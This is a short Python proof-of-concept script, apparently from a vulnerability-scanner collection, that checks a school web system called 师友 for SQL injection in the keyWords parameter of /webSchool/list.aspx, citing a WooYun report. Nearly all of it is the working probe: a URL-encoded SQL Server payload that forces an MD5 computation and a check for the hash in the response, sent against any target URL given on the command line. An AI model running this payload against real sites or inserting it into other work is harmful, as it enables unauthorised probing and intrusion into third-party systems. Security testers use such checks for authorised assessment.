#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 师友list.aspx keywords SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-082296
author: Lucifer
description: 文件/webSchool/list.aspx中,参数keywords存在SQL注入。
'''
import sys
import requests



class shiyou_list_keyWords_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/webSchool/list.aspx?keyWords=1%%27AnD/**/1>Sys.Fn_VarbinTohexstr(HashBytes(%27Md5%27,%271234%27))AnD/**/%27%%27=%27"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在师友list.aspx keywords SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = shiyou_list_keyWords_sqli_BaseVerify(sys.argv[1])
    testVuln.run()